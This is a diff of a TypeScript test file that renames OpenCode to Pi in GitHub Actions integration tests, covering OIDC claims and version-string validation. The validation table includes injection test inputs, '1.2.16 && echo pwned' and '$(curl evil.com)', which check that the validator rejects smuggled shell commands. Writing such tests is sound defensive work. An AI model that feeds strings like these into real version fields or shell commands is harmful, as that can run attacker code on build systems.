@@ -25,7 +25,7 @@ import {
   channel as githubChannel,
   createGitHubWebhookChannel,
 } from "../src/channels/github";
-import { validateOpenCodeVersion } from "../github/script/context";
+import { validatePiVersion } from "../github/script/context";
 import type { Env } from "../src/types";
 import type { WorkflowRunPayload } from "../src/types";
 
@@ -380,7 +380,7 @@ describe("OIDC Claim Parsing", () => {
     const claims = {
       iss: "https://token.actions.githubusercontent.com",
       sub: "repo:octocat/hello-world:ref:refs/heads/main",
-      aud: "opencode-github-action",
+      aud: "pi-github-action",
       exp: Math.floor(Date.now() / 1000) + 3600,
       iat: Math.floor(Date.now() / 1000),
       repository: "octocat/hello-world",
@@ -1052,17 +1052,17 @@ describe("resolvePermissions", () => {
 });
 
 // ---------------------------------------------------------------------------
-// OpenCode Version Validation
+// Pi Version Validation
 // ---------------------------------------------------------------------------
 
-describe("OpenCode Version Validation", () => {
+describe("Pi Version Validation", () => {
   it.each([
     { input: undefined, expected: "latest", label: "undefined" },
     { input: "", expected: "latest", label: "empty string" },
     { input: "  ", expected: "latest", label: "whitespace only" },
     { input: "latest", expected: "latest", label: "latest" },
-    { input: "dev", expected: "dev", label: "dev" },
-    { input: "1.2.16", expected: "1.2.16", label: "basic semver" },
+    { input: "dev", expected: "latest", label: "unsupported dev tag" },
+    { input: "0.83.0", expected: "0.83.0", label: "basic semver" },
     { input: "0.1.0", expected: "0.1.0", label: "zero major" },
     { input: "1.2.16-beta.1", expected: "1.2.16-beta.1", label: "pre-release" },
     { input: "1.2.16-rc1", expected: "1.2.16-rc1", label: "rc pre-release" },
@@ -1075,7 +1075,7 @@ describe("OpenCode Version Validation", () => {
     { input: "1.2.16 && echo pwned", expected: "latest", label: "command injection" },
     { input: "$(curl evil.com)", expected: "latest", label: "subshell injection" },
   ])("$label ($input) → $expected", ({ input, expected }) => {
-    expect(validateOpenCodeVersion(input)).toBe(expected);
+    expect(validatePiVersion(input)).toBe(expected);
   });
 });
 
